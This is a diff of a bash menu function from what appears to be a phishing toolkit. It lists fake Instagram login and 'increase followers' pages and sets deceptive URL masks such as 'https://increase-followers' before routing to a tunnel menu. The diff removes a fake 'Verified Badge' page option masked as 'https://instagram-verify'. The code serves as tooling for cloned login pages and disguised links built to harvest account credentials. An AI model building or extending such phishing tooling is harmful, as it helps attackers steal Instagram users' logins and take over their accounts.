@@ -304,7 +304,6 @@ site_instagram() {
 		${RED}[${WHITE}01${RED}]${CYAN} Instagram Login Page
 		${RED}[${WHITE}02${RED}]${CYAN} Instagram Increase Followers Page
 		${RED}[${WHITE}03${RED}]${CYAN} Instagram Increase Followers(1) Page
-		${RED}[${WHITE}04${RED}]${CYAN} Instagram Verified Badge Registeration Page
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -320,10 +319,6 @@ site_instagram() {
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
 		website="ig_increase"
 		mask='https://increase-followers'
-		tunnel_menu
-	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
-		website="ig_verify"
-		mask='https://instagram-verify'
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
